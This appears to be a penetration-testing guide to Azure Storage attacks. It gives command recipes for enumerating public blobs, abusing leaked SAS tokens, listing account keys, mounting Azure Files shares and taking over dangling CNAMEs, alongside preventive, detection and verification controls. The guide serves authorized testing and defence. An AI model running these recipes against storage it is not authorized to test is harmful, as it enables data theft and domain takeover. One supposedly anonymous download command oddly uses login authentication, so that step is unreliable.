# Storage and Blob Attacks

> [!CAUTION]
> This file is for authorized security testing of Azure subscriptions and tenants you own or have explicit written permission to assess. Do not use these techniques against subscriptions, tenants, or services you do not own or have permission to test.

## 1. Overview

Azure Storage is a family of four data services under one storage account:

- **Blob Storage** - object storage for unstructured data (files, images, backups, logs, Terraform state). This is the most commonly exposed service.
- **Azure Files** - SMB and NFS file shares, mountable from Windows and Linux over port 445 (SMB) or 2049 (NFS).
- **Queue Storage** - message queues, often used between application tiers.
- **Table Storage** - NoSQL key-value store, often used for configuration and metadata.

Every storage account has a unique name (3-24 lowercase letters and digits, globally unique in `*.blob.core.windows.net`, `*.file.core.windows.net`, `*.queue.core.windows.net`, `*.table.core.windows.net`). The account name is the first half of the public endpoint, and it is often guessable from the organization name.

A storage account supports three authentication mechanisms, and confusing them is the most common source of Azure storage exposure:

- **Shared Key** - the storage account access keys (`key1`, `key2`). Full control over every service in the account. Any principal with `Microsoft.Storage/storageAccounts/listKeys/action` can retrieve both keys with a single API call.
- **Shared Access Signature (SAS)** - a time-limited, scope-limited token signed with either an account key (account SAS, service SAS) or a user delegation key (user delegation SAS). A leaked SAS token is a full credential for the resources it covers, until it expires.
- **Azure AD (Entra ID) authentication** - the principal authenticates to Entra ID, and the RBAC role assignment (`Storage Blob Data Reader`, `Storage Blob Data Contributor`, `Storage Blob Data Owner`) controls access. This is the only mechanism that supports fine-grained per-principal access and Conditional Access.

The storage account also has a set of account-level network controls: `publicNetworkAccess`, `networkAcls` (allow/deny by IP, VNet, or Azure service), and private endpoints. A storage account with `publicNetworkAccess: Enabled` and `networkAcls.defaultAction: Allow` is reachable from the entire internet.

This file covers the attack surface of Azure Storage: how public blobs are discovered, how SAS tokens leak, how account keys are retrieved, how Azure Files shares are mounted, and how the defensive controls (private endpoints, `AllowBlobPublicAccess: false`, `AllowSharedKeyAccess: false`, SAS expiration policy) are configured.

## 2. Reconnaissance / Enumeration

### 2.1 Unauthenticated blob discovery

Blob containers can be public at three access levels: `Private` (default), `Blob` (anonymous read on individual blobs, no listing), and `Container` (anonymous read and listing on the container). The unauthenticated enumeration is a simple HTTP request per container name:

```bash
# Check if a container is publicly listable
curl -s "https://<account>.blob.core.windows.net/<container>?restype=container&comp=list"

# Check a single blob (if access level is Blob or Container)
curl -s -I "https://<account>.blob.core.windows.net/<container>/<blob>"
```

Response codes:

- `200` with an XML body - container is publicly listable. This is an immediate data-exposure finding.
- `404` - container does not exist (or the account does not exist; the two are distinguishable by the response body).
- `403` - container exists but anonymous access is denied.
- `409` - public access is disabled at the account level (`AllowBlobPublicAccess: false`).

### 2.2 Storage account enumeration

Storage account names are guessable and the endpoint is public. The first step is to enumerate account names and their properties:

```bash
# Check if a storage account name exists (the DNS name resolves)
nslookup <account>.blob.core.windows.net

# With any valid Azure credential, list all storage accounts visible to the identity
az storage account list --query '[].{Name:name,ResourceGroup:resourceGroup,AllowBlobPublicAccess:allowBlobPublicAccess,AllowSharedKeyAccess:allowSharedKeyAccess,PublicNetworkAccess:publicNetworkAccess,MinimumTlsVersion:minimumTlsVersion}'
```

### 2.3 Authenticated blob enumeration

With a credential that has `Storage Blob Data Reader` on the account, the blobs are enumerable directly:

```bash
# List containers
az storage container list --account-name <account> --auth-mode login

# List blobs in a container
az storage blob list --account-name <account> --container-name <container> --auth-mode login

# Search keys for high-value patterns
az storage blob list --account-name <account> --container-name <container> --auth-mode login \
    --query "[?contains(name, 'backup') || contains(name, '.env') || contains(name, 'terraform')].name"
```

The `--auth-mode login` flag uses the Entra ID token, not the account key. If the identity has `Microsoft.Storage/storageAccounts/listKeys/action`, `--auth-mode key` returns the account keys instead.

### 2.4 Azure Files enumeration

Azure Files shares are reachable over SMB (port 445) or NFS (port 2049). SMB is blocked by many ISPs and corporate firewalls, but it is open when the storage account allows public network access and the client has a route to `*.file.core.windows.net`:

```bash
# Probe SMB on a file share (requires port 445 outbound from the tester)
nc -vz <account>.file.core.windows.net 445

# Enumerate shares (with a valid credential)
az storage share list --account-name <account> --auth-mode login

# Enumerate files in a share
az storage file list --account-name <account> --share-name <share> --auth-mode login
```

If the share is public (rare, but possible with a legacy configuration), `smbclient -L` from a Linux host returns the share list without authentication.

## 3. Common Attack Vectors

### 3.1 Public blob access

The classic Azure storage data leak. A container with access level `Container` is listable and readable by anyone on the internet. A container with access level `Blob` is readable but not listable: an attacker must guess the blob name, which is often possible because the names follow a predictable pattern (`backup/`, `db/`, `.env`, `config.json`, `terraform.tfstate`).

### 3.2 SAS token leakage

A Shared Access Signature is a URL parameter (`?sv=...&ss=...&srt=...&sp=...&se=...&st=...&spr=...&sig=...`). It is a full credential for the resources it covers, until it expires. SAS tokens leak in three ways:

- **Source code and configuration files** - a connection string with `SharedAccessSignature=...` committed to a repository.
- **Browser history, chat, and email** - a signed URL shared with a colleague and then forwarded.
- **Application logs and error messages** - a backend that logs the full request URL includes the SAS token.

An account SAS (`ss=b`, `srt=sco`) with `sp=rwdlac` and a long expiry is a full storage compromise.

### 3.3 Account key retrieval

Any principal with `Microsoft.Storage/storageAccounts/listKeys/action` on a storage account can call the `ListKeys` API and receive both account keys. The keys are full control over every service in the account. In many subscriptions, this permission is granted broadly to `Contributor` and `Owner`, which means any resource-group contributor can read every blob, file, queue, and table in the account, regardless of RBAC on individual data-plane resources.

### 3.4 Azure Files over SMB

Azure Files supports identity-based authentication (Entra Domain Services or on-premises AD DS), but a misconfigured share can be reachable with a storage account key, which is a shared credential. Once mounted, the share exposes files with the same structure as an on-premises file server: credentials, configuration, and backups are common.

### 3.5 Storage account takeover via dangling CNAME

A custom domain (`files.example.com`) is often a `CNAME` record pointing to `<account>.blob.core.windows.net`. If the storage account is deleted and the CNAME is not, an attacker registers the same account name in their own subscription and serves attacker-controlled content under the trusted domain.

### 3.6 Soft-delete and snapshot abuse

If soft delete is enabled, a deleted blob remains recoverable for a configured retention window. This is a defensive control, but it also means that an attacker with `Microsoft.Storage/storageAccounts/blobServices/containers/blobs/delete` can delete a blob and the victim can restore it, which complicates incident response. Snapshots preserve the state of a blob at a point in time; an attacker with read access to snapshots can read a previous version of a secret that has since been rotated.

## 4. Exploitation Recipes

### 4.1 Anonymous read of a public container

Precondition: the container is public (`200` on the list request) and the tester has no Azure credentials. The read is a plain HTTP GET:

```bash
# List the container (XML response)
curl -s "https://<account>.blob.core.windows.net/<container>?restype=container&comp=list" | xmllint --format -

# Download every blob in the container
az storage blob download-batch --destination ./loot --source <container> \
    --account-name <account> --auth-mode login --no-progress
```

Expected output of the list request (truncated):

```xml
<?xml version="1.0" encoding="utf-8"?>
<EnumerationResults ServiceEndpoint="https://<account>.blob.core.windows.net/" ContainerName="<container>">
  <Blobs>
    <Blob>
      <Name>backup/db-2026-10-01.sql</Name>
      <Properties>
        <Last-Modified>Wed, 01 Oct 2026 02:00:00 GMT</Last-Modified>
        <Content-Length>1048576</Content-Length>
      </Properties>
    </Blob>
  </Blobs>
</EnumerationResults>
```

### 4.2 SAS token abuse

Precondition: a SAS token leaked in a URL (logs, source code, browser history). The token is self-contained: it has the signature, the scope, and the expiry. It can be used with the Azure CLI or with `curl` directly.

```bash
# Use the SAS token with the Azure CLI
az storage blob list --container-name <container> --account-name <account> \
    --sas-token "<sas-token>" --output table

# Or use it directly with curl
curl -s "https://<account>.blob.core.windows.net/<container>?<sas-token>&restype=container&comp=list"
```

The SAS token signature (`sig=`) is what makes it valid. If the token grants `sp=rwdlac` and `srt=sco` (service, container, object), it is a full storage-account credential for the lifetime of the token.

### 4.3 Account key retrieval with the Azure CLI

Precondition: the current identity has `Microsoft.Storage/storageAccounts/listKeys/action` on the storage account. This permission is granted by the `Contributor` and `Owner` built-in roles at the subscription or resource group scope.

```bash
# Retrieve both account keys
az storage account keys list --account-name <account> --resource-group <rg> --output table

# Use the key to list blobs (bypasses RBAC on individual containers)
az storage container list --account-name <account> --account-key "<key1>"
az storage blob list --account-name <account> --account-key "<key1>" --container-name <container>
```

The key is valid until rotated. An attacker who retrieves it can read and write every blob, file, queue, and table in the account, regardless of RBAC role assignments at the data-plane level.

### 4.4 Mounting an Azure Files share

Precondition: the storage account allows public network access (or the tester is inside an allowed VNet), and the tester has a valid credential (account key, SAS, or identity with `Storage File Data SMB Share Reader`).

```bash
# Mount the share on Linux (requires cifs-utils and port 445 outbound)
sudo mkdir -p /mnt/azfiles
sudo mount -t cifs //<account>.file.core.windows.net/<share> /mnt/azfiles \
    -o vers=3.0,username=<account>,password=<key>,dir_mode=0777,file_mode=0777,serverino

# Or use smbclient to browse without mounting
smbclient //<account>.file.core.windows.net/<share> -U <account>%<key> -c 'ls'
```

Once mounted, the share exposes the files that the share-level permission allows. Credentials, configuration files, and backups are the common high-value targets.

### 4.5 Storage account takeover of a dangling CNAME

Precondition: a `CNAME` record (`files.example.com`) points to `<old-account>.blob.core.windows.net`, and the storage account `<old-account>` no longer exists. The attacker registers the same account name in their own subscription (globally unique name, so it must be unregistered).

```bash
# Confirm the DNS record points to a non-existent account
nslookup files.example.com
curl -s -o /dev/null -w "%{http_code}\n" "https://files.example.com/"

# In the attacker subscription, create a storage account with the same name
az storage account create --name <old-account> --resource-group attacker-rg \
    --location eastus --sku Standard_LRS

# Enable static website hosting and upload an index.html
az storage blob service-properties update --account-name <old-account> \
    --static-website --index-document index.html --404-document 404.html
echo "<html><body>Takeover PoC</body></html>" > index.html
az storage blob upload --account-name <old-account> --container-name '$web' \
    --name index.html --file index.html --auth-mode login
```

The application now serves attacker-controlled content under `files.example.com`.

## 5. Post-Exploitation

After obtaining storage access, the attacker's priorities are data volume, key rotation persistence, and lateral movement.

- **Data volume:** list every container and blob in the account. Backups and Terraform state files are the highest value: a Terraform state file often contains secrets for the entire infrastructure.
- **Persistence through account keys:** the account key is valid until rotation. An attacker with the key can create a new SAS token, or read and write blobs, without touching Entra ID.
- **Persistence through a new SAS token:** a user delegation SAS with a long expiry is an account-key-equivalent credential that does not require the account key.
- **Lateral movement to compute:** a Terraform state file often contains the SSH keys or managed-identity credentials for the VMs and App Services in the environment. A connection string in a configuration file often contains the SQL database credentials or the Key Vault URI.

## 6. Preventive Controls

- **Disable public blob access at the account level.** `AllowBlobPublicAccess: false` on every storage account. This is the default for new accounts created via the portal since 2023, but it is not enforced retroactively.
- **Disable shared key access.** `AllowSharedKeyAccess: false` forces every data-plane operation to use Entra ID authentication, which is auditable per principal. This is the strongest control, but it requires every application to support Entra ID auth.
- **Restrict network access.** `publicNetworkAccess: Disabled` and a private endpoint for every storage account that does not genuinely need to serve the public internet. For the exceptions, use `networkAcls` with a VNet service endpoint or an IP allowlist, and set `defaultAction: Deny`.
- **Enforce TLS 1.2 or higher.** `MinimumTlsVersion: TLS1_2` on every storage account.
- **Use scoped SAS tokens with short expiry.** Prefer user delegation SAS over account SAS, and set a `sasPolicy` on the account that limits the maximum expiry and the allowed services. Enforce short expiry in application code, and never commit a SAS token to source control.
- **Enable Defender for Storage.** Malware scanning for uploaded blobs, sensitive-data discovery, and activity monitoring. It is the only control that detects a malicious upload after the fact.
- **Block outbound SMB from client networks.** Azure Files over SMB is a common exfiltration path; blocking outbound 445 on developer workstations reduces the impact of a leaked key.
- **Restrict `listKeys`.** Only a small break-glass role should hold `Microsoft.Storage/storageAccounts/listKeys/action`. `Contributor` and `Owner` grant it by default; a custom role that removes it is a strong mitigation.

## 7. Detection Controls

The primary log is the **Azure Storage diagnostic log**, which records every data-plane operation (`GetBlob`, `PutBlob`, `DeleteBlob`, `ListBlobs`, `GetFile`, `PutFile`). It is not enabled by default.

- **Enable diagnostic logs** on every storage account, and route them to Log Analytics, a storage account, or an event hub. Set the retention to at least 90 days.
- **Alert on anonymous access.** The `requesterObjectId` field is empty for anonymous requests. An alert on `GetBlob` with an empty `requesterObjectId` catches public-container reads.
- **Alert on `ListKeys`.** A `Microsoft.Storage/storageAccounts/listKeys/action` event in the Azure Activity log is a high-signal event: it should only be called by a small set of automation identities.
- **Alert on `PutBlob` from a new IP or user agent** on a container that only receives writes from a known service.
- **Alert on `SetBlobServiceProperties` and `PutContainerAcl`** - these are the calls that change the public-access setting.
- **Defender for Storage** findings that overlap with this file: `Storage.Blob_AnomalousAccessPattern`, `Storage.Blob_MaliciousBlob`, `Storage.Blob_SensitiveDataDiscovery`, `Storage.Blob_AccessFromUnusualLocation`.

## 8. Verification

Read-only checks to confirm the preventive controls are in place:

```bash
# Public blob access and shared key access, per storage account
az storage account list --query '[].{Name:name,ResourceGroup:resourceGroup,AllowBlobPublicAccess:allowBlobPublicAccess,AllowSharedKeyAccess:allowSharedKeyAccess,PublicNetworkAccess:publicNetworkAccess,MinTls:minimumTlsVersion}'

# Containers with public access level
for sa in $(az storage account list --query '[].name' -o tsv); do
    echo "=== $sa ==="
    az storage container list --account-name "$sa" --auth-mode login --query "[?properties.publicAccess!='None'].{Name:name,PublicAccess:properties.publicAccess}"
done

# Storage accounts without a private endpoint
az network private-endpoint list --query '[].{Name:name,PrivateLinkServiceId:privateLinkServiceConnections[0].privateLinkServiceId}' --output table

# SAS policy on the storage account (maximum expiry)
az storage account show --name <account> --resource-group <rg> --query 'sasPolicy'
```

Expected result: every storage account with `AllowBlobPublicAccess: false`, `AllowSharedKeyAccess: false` where possible, `PublicNetworkAccess: Disabled` (or a documented VNet restriction), `MinTls: TLS1_2`, no container with `PublicAccess: Container` or `PublicAccess: Blob`, and a `sasPolicy` with a finite `expirationAction` and a `sasExpirationPeriod`.

## 9. Certification Alignment

- **Microsoft Certified: Azure Security Engineer Associate (AZ-500)** - storage security, data protection, network controls, key management.
- **Microsoft Certified: Azure Administrator Associate (AZ-104)** - storage account configuration, access keys, SAS, Azure Files.
- **CompTIA Security+** - data protection, access control, encryption at rest and in transit.

## 10. Production Notes

- `AllowBlobPublicAccess: false` is the default for new accounts but not for existing ones. Audit every storage account, not just the new ones.
- `AllowSharedKeyAccess: false` breaks any application that uses a connection string with an account key. The migration to Entra ID authentication is not instant; plan it as a project, not a switch.
- The account key is a shared credential: it has no per-principal attribution. Every operation with the key is logged as the account, not as the caller. Entra ID authentication is the only way to attribute an operation to a principal.
- Azure Files over SMB is often blocked by ISPs and corporate networks. Do not assume that a storage account with a public endpoint is reachable over SMB from the internet.
- Terraform state files in a storage account are the highest-value blob in most Azure environments. Encrypt them, restrict access, and treat them as production secrets.

## 11. References

- Azure Storage documentation - https://learn.microsoft.com/en-us/azure/storage/
- Blob Storage access control - https://learn.microsoft.com/en-us/azure/storage/blobs/access-control
- Shared Access Signatures - https://learn.microsoft.com/en-us/azure/storage/common/storage-sas-overview
- Azure Files identity-based authentication - https://learn.microsoft.com/en-us/azure/storage/files/storage-files-active-directory-overview
- Microsoft Defender for Storage - https://learn.microsoft.com/en-us/azure/defender-for-cloud/defender-for-storage-introduction
- Azure Storage security guide - https://learn.microsoft.com/en-us/azure/storage/blobs/security-recommendations
